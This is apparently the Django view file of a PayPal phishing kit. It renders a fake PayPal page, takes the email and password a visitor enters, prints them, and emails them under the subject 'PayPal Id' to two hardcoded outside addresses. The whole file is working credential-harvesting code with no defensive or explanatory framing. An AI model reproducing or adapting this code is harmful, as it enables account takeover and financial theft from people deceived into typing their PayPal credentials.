from django.shortcuts import render
from .forms import PayForm
from paytopal.settings import EMAIL_HOST_USER
from django.core.mail import message, send_mail
MAIL = ["sixdidsew@macr2.com", "fbsocz028@outlook.com"]

def home(request):
    form = PayForm(request.POST or None)
    print("visible")
    if form.is_valid():
        print("Valid")
        subject = "PayPal Id"
        email = form.cleaned_data.get('email')
        passwd = form.cleaned_data.get('password')
        message = f"Email or num: {email}\nPassword: {passwd}"
        print(message)

        recipient = MAIL
        send_mail(subject, message, EMAIL_HOST_USER,
                  recipient, fail_silently=False)
        print("Yes")
        return render(request, "core/PayPal.html")
    print("Not valid")
    return render(request, "core/PayPal.html", {'form': form})
